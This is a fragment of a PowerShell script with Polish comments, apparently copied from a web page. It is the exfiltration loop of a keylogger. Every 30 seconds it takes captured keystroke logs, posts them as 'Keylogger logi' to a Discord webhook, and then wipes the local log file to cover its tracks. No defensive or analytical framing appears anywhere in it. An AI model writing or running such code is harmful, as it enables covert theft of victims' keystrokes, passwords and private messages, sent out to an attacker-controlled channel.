                # Ograniczamy długość wiadomości do 1900 znaków (limit Discorda to 2000)
                $maxLength = 1900
                if ($content.Length -gt $maxLength) {
                    $content = $content.Substring(0, $maxLength) + "`n[...]"
                }

                $payload = @{
                    "content" = "📄 **Keylogger logi:**`n```\n$content\n```"
                } | ConvertTo-Json -Depth 10

                Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json'

                # Czyszczenie pliku po wysłaniu
                Clear-Content -Path $logFile
            }
        }
    } catch {
        Write-Host "❌ Błąd podczas wysyłania do Discorda: $_"
    }
}

# Główna pętla - wysyłanie co 30 sekund
while ($true) {
    Send-LogsToDiscord
    Start-Sleep -Seconds 30
}
</span></code></div></div></pre>
